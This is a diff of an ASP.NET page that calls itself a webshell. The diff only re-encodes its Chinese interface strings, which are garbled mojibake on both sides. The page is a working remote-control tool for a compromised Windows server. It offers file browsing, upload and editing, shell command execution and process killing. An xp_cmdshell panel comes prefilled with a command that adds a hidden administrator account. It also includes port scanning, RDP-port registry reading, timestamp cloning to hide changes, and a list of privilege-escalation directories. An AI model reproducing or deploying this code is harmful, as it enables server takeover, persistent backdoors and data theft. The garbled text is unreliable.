@@ -53,11 +53,11 @@ foreach (Process allprocess in process)
 ListBoxPro.Items.Add(allprocess.ProcessName);
 }
 string ProcessNum = ListBoxPro.Items.Count.ToString();
-LbNum.Text = ProcessNum + "¸ö";
+LbNum.Text = ProcessNum + "ä¸ª";
 }
 void DownFile(string src)
 {
-string pathfile = src; //pathfile ÒªÏÂÔØµÄÎÄ¼şÃû³Æ
+string pathfile = src; //pathfile è¦ä¸‹è½½çš„æ–‡ä»¶åç§°
 FileInfo file = new FileInfo(pathfile);
 Response.Clear();
 Response.AddHeader("Content-Disposition", "attachment; filename=" + HttpUtility.UrlEncode(file.Name));
@@ -71,13 +71,13 @@ void GetDir(string Url,string file_name)
 {
 Response.Write("<table align =\"center\">");
 Response.Write("<tr>");
-Response.Write("<td>ÎÄ¼şÃû</td>");
+Response.Write("<td>æ–‡ä»¶å</td>");
 Response.Write("<td> </td>");
-Response.Write("<td>´óĞ¡</td>");
+Response.Write("<td>å¤§å°</td>");
 Response.Write("<td> </td>");
-Response.Write("<td>ĞŞ¸ÄÊ±¼ä</td>");
+Response.Write("<td>ä¿®æ”¹æ—¶é—´</td>");
 Response.Write("<td> </td>");
-Response.Write("<td>²Ù×÷</td>");
+Response.Write("<td>æ“ä½œ</td>");
 Response.Write("</tr>");
 
 DirectoryInfo dir = new DirectoryInfo(Url);
@@ -88,7 +88,7 @@ try
 DirectoryInfo[] dirs = dir.GetDirectories();
 Response.Write("<tr>");
 Response.Write("<a href='?page=index&src=" +Server.UrlEncode(GetParentDir(file_name)));
-Response.Write("'><font color='red'>/*»ØÉÏÒ»²ãÄ¿Â¼*/</a></font>");
+Response.Write("'><font color='red'>/*å›ä¸Šä¸€å±‚ç›®å½•*/</a></font>");
 Response.Write("\r\n");
 Response.Write("</tr>");
 
@@ -101,7 +101,7 @@ Response.Write("<a href='?page=index&src="+Server.UrlEncode(file_name)+Server.Ur
 Response.Write("</td>");
 Response.Write("<td> </td>");
 Response.Write("<td>");
-Response.Write("<Ä¿Â¼>");
+Response.Write("<ç›®å½•>");
 Response.Write("</td>");
 Response.Write("<td> </td>");
 Response.Write("<td>");
@@ -129,7 +129,7 @@ Response.Write("<td> </td>");
 Response.Write("<td>");
 string size = file_name + "\\" + filed.Name.ToString();
 FileInfo info = new FileInfo(size);
-Response.Write(info.Length.ToString() + "×Ö½Ú");
+Response.Write(info.Length.ToString() + "å­—èŠ‚");
 Response.Write("</td>");
 Response.Write("<td> </td>");
 Response.Write("<td>");
@@ -163,7 +163,7 @@ Response.Write("</tr>");
 }
 catch (Exception)
 {
-Response.Write("²»´æÔÚ»ò·ÃÎÊ±»¾Ü¾ø!");
+Response.Write("ä¸å­˜åœ¨æˆ–è®¿é—®è¢«æ‹’ç»!");
 return;
 }
 Response.Write("</table>");
@@ -180,14 +180,14 @@ string src = Request.QueryString["src"];
 <script language="javascript">
 function del()
 {
-if (confirm("´ó¸ç,ÕæÒªÉ¾Âğ?ËãÄãºİ!!")) { return true; }
+if (confirm("å¤§å“¥,çœŸè¦åˆ å—?ç®—ä½ ç‹ !!")) { return true; }
 else { return false; }
 }
 </script>
 <script language="javascript">
 function down()
 {
-if (confirm("Èç¹ûÄãÏÂÔØµÄÎÄ¼ş´óÓÚ20M\n½¨Òé²»ÒªÓÃ´Ë·½Ê½ÏÂÔØ\nÄã¿ÉÒÔ½«´ËÎÄ¼ş¿½±´ÎÄ¼şµ½webÄ¿Â¼ÏÂ,Ê¹ÓÃHTTPÏÂÔØ\nÄã»¹ÊÇÈ·¶¨ÓÃ´Ë·½Ê½ÏÂÔØÂğ?")){ return true;}
+if (confirm("å¦‚æœä½ ä¸‹è½½çš„æ–‡ä»¶å¤§äº20M\nå»ºè®®ä¸è¦ç”¨æ­¤æ–¹å¼ä¸‹è½½\nä½ å¯ä»¥å°†æ­¤æ–‡ä»¶æ‹·è´æ–‡ä»¶åˆ°webç›®å½•ä¸‹,ä½¿ç”¨HTTPä¸‹è½½\nä½ è¿˜æ˜¯ç¡®å®šç”¨æ­¤æ–¹å¼ä¸‹è½½å—?")){ return true;}
 else{ return false; }
 }
 </script>
@@ -214,38 +214,38 @@ if (Session["root"] != null)
 %>
 <table align='center'>
 <tr>
-<td><font color="red">¹¦ÄÜ:</font></td>
+<td><font color="red">åŠŸèƒ½:</font></td>
 <td>
 <%
-Response.Write("<a href='?page=index&src=" + Server.MapPath(".") + "\\'><font color='#009900'>WebshellÄ¿Â¼</font></a>");
+Response.Write("<a href='?page=index&src=" + Server.MapPath(".") + "\\'><font color='#009900'>Webshellç›®å½•</font></a>");
 %>
 </td>
-<td><a href='?page=info'><font color="#009900">»ù±¾ĞÅÏ¢</font></a></td>
-<td><a href='?page=process'><font color="#009900">½ø³Ì¹ÜÀí</font></a></td>
-<td><a href='?page=newfile'><font color="#009900">ĞÂ½¨ÎÄ¼ş</font></a></td>
-<td><a href='?page=newdir'><font color="#009900">ĞÂ½¨Ä¿Â¼</font></a></td>
-<td><a href='?page=upload'><font color="#009900">ÎÄ¼şÉÏ´«</font></a></td>
-<td><a href='?page=reg'><font color="#009900">×¢²á±í¶ÁÈ¡</font></a></td>
-<td><a href='?page=cmd'><font color="#009900">cmdÖ´ĞĞ</font></a></td>
-<td><a href='?page=sql'><font color="#009900">sqlÖ´ĞĞ</font></a></td>
-<td><a href='?page=scan'><font color="#009900">¶Ë¿ÚÉ¨Ãè</font></a></td>
-<td><a href='?page=clonetime'><font color="#009900">¿ËÂ¡Ê±¼ä</font></a></td>
-<td><a href='?page=download'><font color="#009900">Ô¶³ÌÎÄ¼şÏÂÔØ</font></a></td>
-<td><a href='?page=logout'><font color="#009900">µÇ³ö</font></a></td>
+<td><a href='?page=info'><font color="#009900">åŸºæœ¬ä¿¡æ¯</font></a></td>
+<td><a href='?page=process'><font color="#009900">è¿›ç¨‹ç®¡ç†</font></a></td>
+<td><a href='?page=newfile'><font color="#009900">æ–°å»ºæ–‡ä»¶</font></a></td>
+<td><a href='?page=newdir'><font color="#009900">æ–°å»ºç›®å½•</font></a></td>
+<td><a href='?page=upload'><font color="#009900">æ–‡ä»¶ä¸Šä¼ </font></a></td>
+<td><a href='?page=reg'><font color="#009900">æ³¨å†Œè¡¨è¯»å–</font></a></td>
+<td><a href='?page=cmd'><font color="#009900">cmdæ‰§è¡Œ</font></a></td>
+<td><a href='?page=sql'><font color="#009900">sqlæ‰§è¡Œ</font></a></td>
+<td><a href='?page=scan'><font color="#009900">ç«¯å£æ‰«æ</font></a></td>
+<td><a href='?page=clonetime'><font color="#009900">å…‹éš†æ—¶é—´</font></a></td>
+<td><a href='?page=download'><font color="#009900">è¿œç¨‹æ–‡ä»¶ä¸‹è½½</font></a></td>
+<td><a href='?page=logout'><font color="#009900">ç™»å‡º</font></a></td>
 </tr>
 <tr>
 <td colspan=14><hr></td>
 </tr>
 <table align ="center">
 <tr>
-<td><font color="red">ÌáÈ¨Ä¿Â¼:</font> </td>
+<td><font color="red">ææƒç›®å½•:</font> </td>
 <td><a href='?page=index&src=C:\Program Files\'><font color="#009900">Program Files</font></a> </td>
 <td><a href='?page=index&src=C:\Documents and Settings\All Users\Documents\'><font color="#009900">Documents</font></a> </td>
 <td><a href='?page=index&src=C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\'><font color="#009900">PcAnywhere</font></a> </td>
-<td><a href='?page=index&src=C:\Documents and Settings\All Users\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌĞò\'><font color="#009900">¿ªÊ¼²Ëµ¥</font></a> </td>
+<td><a href='?page=index&src=C:\Documents and Settings\All Users\ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\'><font color="#009900">å¼€å§‹èœå•</font></a> </td>
 <td><a href='?page=index&src=C:\Documents and Settings\All Users\'><font color="#009900">All Users</font></a> </td>
-<td><a href='?page=index&src=C:\Program Files\serv-u\'><font color="#009900">Serv-uÄ¿Â¼I</font></a> </td>
-<td><a href='?page=index&src=C:\Program Files\RhinoSoft.com\'><font color="#009900">Serv-uÄ¿Â¼II</font></a> </td>
+<td><a href='?page=index&src=C:\Program Files\serv-u\'><font color="#009900">Serv-uç›®å½•I</font></a> </td>
+<td><a href='?page=index&src=C:\Program Files\RhinoSoft.com\'><font color="#009900">Serv-uç›®å½•II</font></a> </td>
 <td><a href='?page=index&src=C:\Program Files\Real\'><font color="#009900">Real</font></a> </td>
 <td><a href='?page=index&src=C:\Program Files\Microsoft SQL Server\'><font color="#009900">Sql Server</font></a> </td>
 <td><a href='?page=index&src=C:\WINDOWS\system32\config\'><font color="#009900">Config</font></a> </td>
@@ -259,7 +259,7 @@ Response.Write("<a href='?page=index&src=" + Server.MapPath(".") + "\\'><font co
 <table align ="center">
 <tr>
 <td>
-<font color="red">ÅÌ·ûä¯ÀÀ:</font>
+<font color="red">ç›˜ç¬¦æµè§ˆ:</font>
 <% 
 String[] drives = Environment.GetLogicalDrives();
 for (int i = 0; i < drives.Length; i++)
@@ -274,7 +274,7 @@ Response.Write("<a href ='"+ GetWebName() +"?page=index&src="+drives[i]+"'>"+ dr
 
 <table align = "center">
 
-<font color = "red"> µ±Ç°Â·¾¶:</font>
+<font color = "red"> å½“å‰è·¯å¾„:</font>
 <font color = "#009900"> 
 <%
 if (src == null)
@@ -307,27 +307,27 @@ this.LbBBC.Text = Environment.OSVersion.ToString();
 <table align='center'> 
 <tr>
 <td colspan="10">
-<asp:Label ID="LbServerName" runat="server" Text="¼ÆËã»úÃû:" ForeColor="Red"></asp:Label>
+<asp:Label ID="LbServerName" runat="server" Text="è®¡ç®—æœºå:" ForeColor="Red"></asp:Label>
 <asp:Label ID="LbServerNameC" runat="server" BorderStyle="None"></asp:Label></br>
-<asp:Label ID="LbLang" runat="server" Text="¼ÆËã»úÓïÑÔ:" ForeColor="Red"></asp:Label>
+<asp:Label ID="LbLang" runat="server" Text="è®¡ç®—æœºè¯­è¨€:" ForeColor="Red"></asp:Label>
 <asp:Label ID="LbLangC" runat="server"></asp:Label></br>
-<asp:Label ID="LbIp" runat="server" Text="¼ÆËã»úIP:" ForeColor="Red"></asp:Label>
+<asp:Label ID="LbIp" runat="server" Text="è®¡ç®—æœºIP:" ForeColor="Red"></asp:Label>
 <asp:Label ID="LbIpC" runat="server"></asp:Label></br>
-<asp:Label ID="LbUser" runat="server" Text="µ±Ç°ÓÃ»§:" ForeColor="Red"></asp:Label>
+<asp:Label ID="LbUser" runat="server" Text="å½“å‰ç”¨æˆ·:" ForeColor="Red"></asp:Label>
 <asp:Label ID="LbUserc" runat="server"></asp:Label></br>
-<asp:Label ID="LbBB" runat="server" Text="·şÎñÆ÷°æ±¾:" ForeColor="Red"></asp:Label>
+<asp:Label ID="LbBB" runat="server" Text="æœåŠ¡å™¨ç‰ˆæœ¬:" ForeColor="Red"></asp:Label>
 <asp:Label ID="LbBBC" runat="server"></asp:Label></br>
 <asp:Label ID="LbDns" runat="server" Text="DNS:" ForeColor="Red"></asp:Label>
 <asp:Label ID="LbDnsC" runat="server"></asp:Label></br>
-<asp:Label ID="LbTime" runat="server" Text="¼ÆËã»úÊ±¼ä:" ForeColor="Red"></asp:Label>
+<asp:Label ID="LbTime" runat="server" Text="è®¡ç®—æœºæ—¶é—´:" ForeColor="Red"></asp:Label>
 <asp:Label ID="LbTimeC" runat="server"></asp:Label></br>
-<asp:Label ID="LbBrower" runat="server" Text="ä¯ÀÀÆ÷ĞÅÏ¢:" ForeColor="Red"></asp:Label>
+<asp:Label ID="LbBrower" runat="server" Text="æµè§ˆå™¨ä¿¡æ¯:" ForeColor="Red"></asp:Label>
 <asp:Label ID="LbBrowerC" runat="server"></asp:Label></br>
-<asp:Label ID="LbUrl" runat="server" Text="±¾ÎÄ¼şËùÔÚ¾ø¶ÔÂ·¾¶:" ForeColor="Red"></asp:Label>
+<asp:Label ID="LbUrl" runat="server" Text="æœ¬æ–‡ä»¶æ‰€åœ¨ç»å¯¹è·¯å¾„:" ForeColor="Red"></asp:Label>
 <asp:Label ID="LbUrlC" runat="server"></asp:Label></br>
-<asp:Label ID="LbUrlXd" runat="server" Text="±¾ÎÄ¼şËùÔÚÏà¶ÔÂ·¾¶:" ForeColor="Red"></asp:Label>
+<asp:Label ID="LbUrlXd" runat="server" Text="æœ¬æ–‡ä»¶æ‰€åœ¨ç›¸å¯¹è·¯å¾„:" ForeColor="Red"></asp:Label>
 <asp:Label ID="LbUrlXdC" runat="server"></asp:Label></br>
-<asp:Label ID="Lbversion" runat="server" Text=".NET°æ±¾:" ForeColor="Red"></asp:Label>
+<asp:Label ID="Lbversion" runat="server" Text=".NETç‰ˆæœ¬:" ForeColor="Red"></asp:Label>
 <asp:Label ID="Lbversionc" runat="server"></asp:Label></br>
 
 </td>
@@ -341,12 +341,12 @@ else if ((page == "reg") && (Session["root"] != null))
 %> 
 <table align='center'>
 <form id="Form2" runat="server">
-<asp:Label ID="LbRegUrlA" runat="server" Text="ÇëÊäÈëÒª¶ÁÈ¡µÄ¼üÖµ×¢²á±íÂ·¾¶:"></asp:Label>
-<asp:Label ID="LbRegC" runat="server" Text="¾ßÌåÏî£º"></asp:Label><br />
+<asp:Label ID="LbRegUrlA" runat="server" Text="è¯·è¾“å…¥è¦è¯»å–çš„é”®å€¼æ³¨å†Œè¡¨è·¯å¾„:"></asp:Label>
+<asp:Label ID="LbRegC" runat="server" Text="å…·ä½“é¡¹ï¼š"></asp:Label><br />
 <asp:TextBox ID="TextBoxReg" runat="server" Width="551px">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\Wds\rdpwd\Tds\tcp</asp:TextBox>
 <asp:TextBox ID="TextBoxB" runat="server" Width="76px">PortNumber</asp:TextBox></br>
 <asp:Button ID="ButtonReg" runat="server" OnClick="ButtonReg_Click" Text="Regedit" />
-<asp:Label ID="Label1" runat="server" Text="Äú¶ÁÈ¡µÄÖµÎª:"></asp:Label>
+<asp:Label ID="Label1" runat="server" Text="æ‚¨è¯»å–çš„å€¼ä¸º:"></asp:Label>
 <asp:Label ID="LbReg" runat="server" Width="319px"></asp:Label>
 </form>
 </table>
@@ -360,7 +360,7 @@ try
 
 string regvalue = TextBoxReg.Text;
 string val = TextBoxB.Text;
-string vals = "¸ÃÖµ²»´æÔÚÅ¶";
+string vals = "è¯¥å€¼ä¸å­˜åœ¨å“¦";
 
 char[] separator = { '\\' };
 String[] patharray = new String[80];
@@ -405,7 +405,7 @@ break;
 }
 catch (Exception)
 {
-Response.Write("»òĞíÓĞÊ²Ã´µØ·½ÊäÈë´íÎó?»òĞí×¢²á±í²»ÔÊĞí¶Á?");
+Response.Write("æˆ–è®¸æœ‰ä»€ä¹ˆåœ°æ–¹è¾“å…¥é”™è¯¯?æˆ–è®¸æ³¨å†Œè¡¨ä¸å…è®¸è¯»?");
 }
 }
 
@@ -419,9 +419,8 @@ else if ((page == "upload") && (Session["root"] != null))
 
 <table align="center">
 <form id="Form1" method="post" encType="multipart/form-data" runat="server">
-±£´æÂ·¾¶:<asp:TextBox ID="TextBoxSaveUpUrl" runat="server" Width="417px"></asp:TextBox><br />
-<input name="upfile" type="file" class="TextBox" id="UpFile" runat="server"¡¡style="width: 447px">
-<asp:Button ID="ButtonFuckUp" runat="server" OnClick="ButtonFuckUp_Click" Text="ÉÏ´«" Width="57px" /><br />
+<input name="upfile" type="file" class="TextBox" id="UpFile" runat="server"ã€€style="width: 447px">
+<asp:Button ID="ButtonFuckUp" runat="server" OnClick="ButtonFuckUp_Click" Text="ä¸Šä¼ " Width="57px" /><br />
 </form>
 </table>
 <script runat="server">
@@ -440,7 +439,7 @@ else if ((page == "cmd") && (Session["root"] != null))
 %>
 <table align='center'>
 <form id="Form3" runat="server">
-<asp:Label ID="LbDos" runat="server" Text="DOSÃüÁî:"></asp:Label>
+<asp:Label ID="LbDos" runat="server" Text="DOSå‘½ä»¤:"></asp:Label>
 <asp:TextBox ID="TextBoxDos" runat="server" Width="499px">net user</asp:TextBox>
 <asp:Button ID="ButtonDos" runat="server" OnClick="ButtonCmd_Click" Text="CMD" /></br>
 <asp:TextBox ID="TextBoxDosC" runat="server" Height="300px" Width="570px" BorderStyle="Dotted" TextMode="MultiLine"></asp:TextBox>
@@ -476,10 +475,10 @@ else if ((page == "sql") && (Session["root"] != null))
 <asp:TextBox ID="TextBoxSqlB" runat="server" >sa</asp:TextBox>
 <asp:Label ID="LbSqlC" runat="server" Text="Sql Pwd:"></asp:Label>
 <asp:TextBox ID="TextBoxSqlC" runat="server">sa</asp:TextBox>
-<asp:Button ID="ButtonSqlCon" runat="server" Text="Á¬½Ó" Width="51px" OnClick="ButtonSqlCon_Click" /></br>
+<asp:Button ID="ButtonSqlCon" runat="server" Text="è¿æ¥" Width="51px" OnClick="ButtonSqlCon_Click" /></br>
 <asp:Label ID="LbSqlD" runat="server" Text="Command:" Width="42px"></asp:Label>
 <asp:TextBox ID="TextBoxSqlCon" runat="server" Width="400px" >net user char char /add & net localgroup administrators char /add</asp:TextBox>
-<asp:Button ID="ButtonSqlCmd" runat="server" Text="Ö´ĞĞ" Width="52px" OnClick="ButtonSqlCmd_Click" /></br>
+<asp:Button ID="ButtonSqlCmd" runat="server" Text="æ‰§è¡Œ" Width="52px" OnClick="ButtonSqlCmd_Click" /></br>
 <asp:TextBox ID="TextBoxSqlCmd" runat="server" Height="106px" Width="470px"></asp:TextBox>
 </form>
 </table>
@@ -492,11 +491,11 @@ SqlConnection mycon = new SqlConnection();
 mycon.ConnectionString = "Persist Security Info = False;User id =" + TextBoxSqlB.Text + ";pwd=" + TextBoxSqlC.Text + ";server=" + TextBoxSqlA.Text;
 mycon.Open();
 mycon.Close();
-Response.Write("¹§Ï²Äã,Á¬½Ó²âÊÔ³É¹¦!");
+Response.Write("æ­å–œä½ ,è¿æ¥æµ‹è¯•æˆåŠŸ!");
 }
 catch (Exception)
 {
-Response.Write("Çë¼ì²éÕË»§ÃÜÂë,Á¬½Ó²âÊÔÊ§°Ü!");
+Response.Write("è¯·æ£€æŸ¥è´¦æˆ·å¯†ç ,è¿æ¥æµ‹è¯•å¤±è´¥!");
 }
 }
 
@@ -512,12 +511,12 @@ cmd.Connection = mycon;
 cmd.CommandText = "exec master..xp_cmdshell '" + TextBoxSqlCon.Text + "'";
 cmd.ExecuteNonQuery();
 
-TextBoxSqlCmd.Text = "ÃüÁî³É¹¦Ö´ĞĞ!";
+TextBoxSqlCmd.Text = "å‘½ä»¤æˆåŠŸæ‰§è¡Œ!";
 mycon.Close();
 }
 catch (Exception)
 {
-TextBoxSqlCmd.Text = "ÃüÁîÖ´ĞĞÊ§°Ü!";
+TextBoxSqlCmd.Text = "å‘½ä»¤æ‰§è¡Œå¤±è´¥!";
 }
 
 }
@@ -532,8 +531,8 @@ else if ((page == "scan") && (Session["root"] != null))
 <table align='center'>
 <form id="Form5" runat="server">
 IP:<asp:TextBox ID="TextBoxScanIP" runat="server" Width="238px">127.0.0.1</asp:TextBox>
-port(¶à¶Ë¿ÚÇëÓÃ¶ººÅ¸ô¿ª)<asp:TextBox ID="TextBoxScanPort" runat="server" Width="238px">21,1433,3389</asp:TextBox>
-<asp:Button ID="ButtonScan" runat="server" OnClick="ButtonScan_Click" Text="É¨Ãè" Width="51px" /><br />
+port(å¤šç«¯å£è¯·ç”¨é€—å·éš”å¼€)<asp:TextBox ID="TextBoxScanPort" runat="server" Width="238px">21,1433,3389</asp:TextBox>
+<asp:Button ID="ButtonScan" runat="server" OnClick="ButtonScan_Click" Text="æ‰«æ" Width="51px" /><br />
 <asp:Label ID="LbScan" runat="server" Width="666px"></asp:Label>
 </form>
 </table>
@@ -554,12 +553,12 @@ int i = int.Parse(portarray[portnum]);
 try
 {
 client.Connect(address, i);
-LbScan.Text +="<font color='red'>"+i.ToString()+"<font>¶Ë¿ÚÔÓ¾Í¿ªÁËÄó!</br>";
+LbScan.Text +="<font color='red'>"+i.ToString()+"<font>ç«¯å£æ‚å°±å¼€äº†æ!</br>";
 client.Close();
 }
 catch (SocketException)
 {
-LbScan.Text += i + "¶Ë¿ÚÔÓÃ»¿ªÄó!<br>";
+LbScan.Text += i + "ç«¯å£æ‚æ²¡å¼€æ!<br>";
 }
 portnum++;
 }
@@ -586,9 +585,9 @@ else if ((page == "clonetime") && (Session["root"] != null))
 
 %> <table align='center'>
 <form id="Form6" runat="server">
-Òª¿ËÂ¡µÄÎÄ¼ş:<asp:TextBox ID="TextBoxWant" runat="server" Width="270px"></asp:TextBox></br>
-±»¿ËÂ¡µÄÎÄ¼ş:<asp:TextBox ID="TextBoxTo" runat="server" Width="270px"></asp:TextBox>
-<asp:Button ID="Button_Clone" runat="server" OnClick="ButtonClone_Click" Text="¿ËÂ¡" Width="48px" />
+è¦å…‹éš†çš„æ–‡ä»¶:<asp:TextBox ID="TextBoxWant" runat="server" Width="270px"></asp:TextBox></br>
+è¢«å…‹éš†çš„æ–‡ä»¶:<asp:TextBox ID="TextBoxTo" runat="server" Width="270px"></asp:TextBox>
+<asp:Button ID="Button_Clone" runat="server" OnClick="ButtonClone_Click" Text="å…‹éš†" Width="48px" />
 </form>
 <table>
 
@@ -610,9 +609,9 @@ else if ((page == "download") && (Session["root"] != null))
 %>
 <table align='center'>
 <form id="Form7" runat="server">
-ÏÂÔØµØÖ·:<asp:TextBox ID="TextBoxDurl" runat="server" Width="270px">http://www.baidu.com/img/logo.gif</asp:TextBox></br>
-±£´æÂ·¾¶:<asp:TextBox ID="TextBoxDfile" runat="server" Width="270px">c:\logo.gif</asp:TextBox>
-<asp:Button ID="ButtonDown" runat="server" OnClick="ButtonDown_Click" Text="ÏÂÔØ" />
+ä¸‹è½½åœ°å€:<asp:TextBox ID="TextBoxDurl" runat="server" Width="270px">http://www.baidu.com/img/logo.gif</asp:TextBox></br>
+ä¿å­˜è·¯å¾„:<asp:TextBox ID="TextBoxDfile" runat="server" Width="270px">c:\logo.gif</asp:TextBox>
+<asp:Button ID="ButtonDown" runat="server" OnClick="ButtonDown_Click" Text="ä¸‹è½½" />
 </form>
 </table>
 <script runat="server">
@@ -639,15 +638,15 @@ else if ((page == "newdir") && (Session["root"] != null))
 %>
 <table align='center'>
 <form id="Form8" runat="server">
-ÊäÈëÂ·¾¶ºÍÎÄ¼ş¼ĞÃû³Æ:<asp:TextBox ID="TextBoxNewDir" runat="server" Width="368px"></asp:TextBox>
-<asp:Button ID="ButtonNewDir" runat="server" OnClick="ButtonNewDir_Click" Text="´´½¨Ä¿Â¼" /><br />
+è¾“å…¥è·¯å¾„å’Œæ–‡ä»¶å¤¹åç§°:<asp:TextBox ID="TextBoxNewDir" runat="server" Width="368px"></asp:TextBox>
+<asp:Button ID="ButtonNewDir" runat="server" OnClick="ButtonNewDir_Click" Text="åˆ›å»ºç›®å½•" /><br />
 </form>
 </table>
 <script runat="server">
 protected void ButtonNewDir_Click(object sender, EventArgs e)
 {
 Directory.CreateDirectory(TextBoxNewDir.Text.ToString());
-Response.Write("Ä¿Â¼´´½¨³É¹¦!");
+Response.Write("ç›®å½•åˆ›å»ºæˆåŠŸ!");
 }
 </script>
 <% 
@@ -659,7 +658,7 @@ else if ((page == "index") && Session["root"] != null)
 <%
 if (src == "")
 {
-Response.Write("<font color='red'>ÎÒÒÑ¾­ÎŞ·¨ÔÙÌøÉÏ²ãÄ¿Â¼ÁË,ÇëÍù»Ø×ß,Ğ»Ğ»!</font>");
+Response.Write("<font color='red'>æˆ‘å·²ç»æ— æ³•å†è·³ä¸Šå±‚ç›®å½•äº†,è¯·å¾€å›èµ°,è°¢è°¢!</font>");
 }
 else
 GetDir(src, src);
@@ -676,26 +675,26 @@ listprocess();
 <table align = "center">
 
 <tr>
-<td><font color ="red">¿É´ø²ÎÊıÖ´ĞĞÖ¸¶¨³ÌĞò¹¦ÄÜ(È¨ÏŞÏŞÖÆ):</font><br>
-<font color ="red">Ö´ĞĞ³ÌĞò(¾ø¶ÔÂ·¾¶):</font><asp:TextBox ID="TextBoxExe" runat="server" Width="200px"></asp:TextBox><br>
-<font color ="red">²ÎÊı(ÈôÎŞ,¿É²»Ğ´):</font>
+<td><font color ="red">å¯å¸¦å‚æ•°æ‰§è¡ŒæŒ‡å®šç¨‹åºåŠŸèƒ½(æƒé™é™åˆ¶):</font><br>
+<font color ="red">æ‰§è¡Œç¨‹åº(ç»å¯¹è·¯å¾„):</font><asp:TextBox ID="TextBoxExe" runat="server" Width="200px"></asp:TextBox><br>
+<font color ="red">å‚æ•°(è‹¥æ— ,å¯ä¸å†™):</font>
 <asp:TextBox ID="TextBoxExeC" runat="server" Width="208px"></asp:TextBox>
-<asp:Button ID="ButtonExe" runat="server" OnClick="ButtonExe_Click" Text="Ö´ĞĞ" Width="44px" /></p>
+<asp:Button ID="ButtonExe" runat="server" OnClick="ButtonExe_Click" Text="æ‰§è¡Œ" Width="44px" /></p>
 <td>
 </tr>
 </table>
 
 <table align="center">
 <tr>
-<font color="red"> µ±Ç°½ø³Ì:</font>
+<font color="red"> å½“å‰è¿›ç¨‹:</font>
 <td>
 
 
 <asp:ListBox ID="ListBoxPro" runat="server" Height="300px" Width="300px"></asp:ListBox><br />
-×Ü½ø³ÌÊı:<asp:Label ID="LbNum" runat="server"></asp:Label><br />
-<asp:Button ID="ButtonProDel" runat="server" OnClick="ButtonProDel_Click" Text="Ñ¡ÖĞ¡¡É¾³ı" Width="70px" />
+æ€»è¿›ç¨‹æ•°:<asp:Label ID="LbNum" runat="server"></asp:Label><br />
+<asp:Button ID="ButtonProDel" runat="server" OnClick="ButtonProDel_Click" Text="é€‰ä¸­ã€€åˆ é™¤" Width="70px" />
 
-<asp:Button ID="ButtonProClear" runat="server" OnClick="ButtonProClear_Click" Text="Ë¢ĞÂ" Width="51px" />
+<asp:Button ID="ButtonProClear" runat="server" OnClick="ButtonProClear_Click" Text="åˆ·æ–°" Width="51px" />
 </form>
 </td>
 </tr>
@@ -721,12 +720,12 @@ string processname = ListBoxPro.SelectedValue.ToString();
 if (processname == kill.ProcessName)
 kill.Kill();
 }
-Response.Write("É¾³ı³É¹¦,ÇëË¢ĞÂÖ®!Èç¹û²»³É¹¦,Çë¶àË¢ĞÂ¼¸´ÎÔÙÊÔ!");
+Response.Write("åˆ é™¤æˆåŠŸ,è¯·åˆ·æ–°ä¹‹!å¦‚æœä¸æˆåŠŸ,è¯·å¤šåˆ·æ–°å‡ æ¬¡å†è¯•!");
 }
 catch (Exception wrong)
 {
-Response.Write("ÏµÍ³´íÎó:" + wrong+"<br>");
-Response.Write("<font color ='red'>Èç¹ûÓĞÏµÍ³´íÎóÌáÊ¾,½¨ÒéË¢ĞÂÒ»´ÎÔÙ³¢ÊÔÉ¾³ı!!!</font>");
+Response.Write("ç³»ç»Ÿé”™è¯¯:" + wrong+"<br>");
+Response.Write("<font color ='red'>å¦‚æœæœ‰ç³»ç»Ÿé”™è¯¯æç¤º,å»ºè®®åˆ·æ–°ä¸€æ¬¡å†å°è¯•åˆ é™¤!!!</font>");
 }
 
 }
@@ -745,7 +744,7 @@ else if ((page == "newfile") && (Session["root"] != null))
 <table align ="center">
 <form runat="server">
 <asp:TextBox ID="TextBoxNewfile" runat="server" Width="477px" ForeColor="#009900" >c:\char.txt</asp:TextBox>
-<asp:Button ID="ButtonNewfile" runat="server" OnClick="ButtonNewfile_Click" Text="±£´æ" Width="57px" /><br />
+<asp:Button ID="ButtonNewfile" runat="server" OnClick="ButtonNewfile_Click" Text="ä¿å­˜" Width="57px" /><br />
 <br />
 <asp:TextBox ID="TextBoxNewfiles" runat="server" Height="324px" ForeColor="#009900" TextMode="MultiLine" Width="537px" ></asp:TextBox><br />
 </form>
@@ -774,7 +773,7 @@ sr.Close();
 <table align='center'>
 <form runat="server">
 <asp:TextBox ID="TextBoxReadDir" runat="server" Width="477px" ForeColor="#009900" ></asp:TextBox>
-<asp:Button ID="ButtonSave" runat="server" OnClick="ButtonSave_Click" Text="±£´æ" Width="57px" /><br />
+<asp:Button ID="ButtonSave" runat="server" OnClick="ButtonSave_Click" Text="ä¿å­˜" Width="57px" /><br />
 <br />
 <asp:TextBox ID="TextBoxFileContent" runat="server" Height="324px" TextMode="MultiLine" Width="537px" ></asp:TextBox><br />
 <br />
@@ -799,10 +798,10 @@ TextBoxRenameTo.Text = src;
 %>
 <table align ="center">
 <form runat="server">
-ÖØÃüÃû:<asp:TextBox ID="TextBoxRename" runat="server" Width="495px"></asp:TextBox><br />
-Îª: 
+é‡å‘½å:<asp:TextBox ID="TextBoxRename" runat="server" Width="495px"></asp:TextBox><br />
+ä¸º: 
 <asp:TextBox ID="TextBoxRenameTo" runat="server" Width="495px"></asp:TextBox>
-<asp:Button ID="ButtonRename" runat="server" OnClick="ButtonRename_Click" Text="ÖØÃüÃû" /><br />
+<asp:Button ID="ButtonRename" runat="server" OnClick="ButtonRename_Click" Text="é‡å‘½å" /><br />
 </form>
 <table>
 <script runat="server">
@@ -821,9 +820,9 @@ TextBoxCopy.Text = src;
 %>
 <form id="Form9" runat="server">
 <table align="center">
-´Ó:<asp:TextBox ID="TextBoxCopy" runat="server" Width="469px"></asp:TextBox><br />
-µ½:<asp:TextBox ID="TextBoxCopyTo" runat="server" Width="468px"></asp:TextBox> 
-<asp:Button ID="ButtonCopy" runat="server" OnClick="ButtonCopy_Click" Text=" ¿½±´" />
+ä»:<asp:TextBox ID="TextBoxCopy" runat="server" Width="469px"></asp:TextBox><br />
+åˆ°:<asp:TextBox ID="TextBoxCopyTo" runat="server" Width="468px"></asp:TextBox> 
+<asp:Button ID="ButtonCopy" runat="server" OnClick="ButtonCopy_Click" Text=" æ‹·è´" />
 </table>
 </form>
 <script runat="server">
@@ -853,7 +852,7 @@ public ArrayList al = new ArrayList();
 
 protected void Page_Load(object sender, EventArgs e)
 {
